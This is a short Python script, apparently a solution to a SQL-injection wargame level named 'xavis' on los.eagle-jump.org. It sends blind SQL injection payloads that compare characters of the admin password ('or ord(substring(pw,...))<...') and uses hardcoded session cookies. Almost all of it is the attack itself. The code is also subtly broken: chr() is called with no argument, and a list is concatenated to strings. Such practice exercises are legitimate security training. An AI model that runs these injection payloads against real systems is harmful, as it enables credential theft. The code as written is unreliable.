import requests
from bs4 import BeautifulSoup

bfs=BeautifulSoup

URL= "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?"
cookie= {
    "__cfduid":"d33f226e52742a4101c7fa523b51564201526036891",
    "PHPSESSID":"ai3otf3joqlbggcceob45aonf2"
}
session1= requests.session()

pw=[]
for i in range(40):
    for j in range(32,127):
        data="pw='or ord(substring(pw,"+str(i+1)+"))<'"+str(j)+"';%00"
        req1=session1.get(URL+data,cookies=cookie)
        print (req1.url)
        if req1.text.find("Hello admin") > -1 :
            pw.append(chr())
            print (pw)
            break

print ("password : "+pw+" or "+pw.lower())
req2= session1.get(URL+"pw="+pw,cookies=cookie)
req2= session1.get(URL+"pw="+pw.lower(),cookies=cookie)